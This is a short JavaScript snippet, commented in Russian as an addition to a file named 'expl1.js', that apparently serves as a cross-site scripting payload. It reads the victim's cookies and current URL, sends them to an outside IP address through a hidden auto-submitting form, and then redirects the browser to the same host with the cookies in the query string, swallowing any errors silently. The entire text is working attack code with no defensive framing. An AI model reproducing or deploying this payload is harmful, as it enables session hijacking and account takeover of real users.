// Добавьте в начало expl1.js:
try {
    // Самый надежный способ - отправить через создание формы
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://109.234.39.144:8889/';
    form.style.display = 'none';
    var input = document.createElement('input');
    input.name = 'data';
    input.value = JSON.stringify({
        cookies: document.cookie,
        url: location.href
    });
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
    
    // Также через redirect
    location.href = 'http://109.234.39.144:8889/?' + encodeURIComponent(document.cookie);
} catch(e) {}
